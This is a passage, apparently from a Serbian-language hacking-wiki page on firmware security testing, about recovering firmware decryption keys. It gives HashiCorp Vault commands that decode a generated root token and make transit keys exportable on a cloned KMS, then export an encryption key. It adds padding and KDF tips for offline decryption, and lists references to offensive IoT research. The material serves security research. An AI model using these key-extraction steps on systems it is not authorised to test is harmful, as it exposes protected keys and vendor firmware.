TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Sa root pristupom na kloniranom KMS-u:

- Učinite transit keys exportable samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap key: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA key uz tačan par padding/hash koji koristi KMS. Neuspešan PKCS#1 v1.5 decrypt i neuspešan podrazumevani OAEP decrypt **ne dokazuju** da je key pogrešan; mnogi Vault-backed tokovi koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, precizno reprodukujte vendorov OpenSSL KDF (`EVP_BytesToKey`, često MD5 na legacy appliances) pre nego što pokušate AES-CBC decryption.

Ovo pretvara problem „encrypted firmware“ u opštiji problem: **oporavite operativne keys sa strane appliance-a, a zatim offline reprodukujte tačne parametre za unwrap + KDF**.

## Obuka i sertifikat

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Reference

- [1] [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodology for Firmware Security Testing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
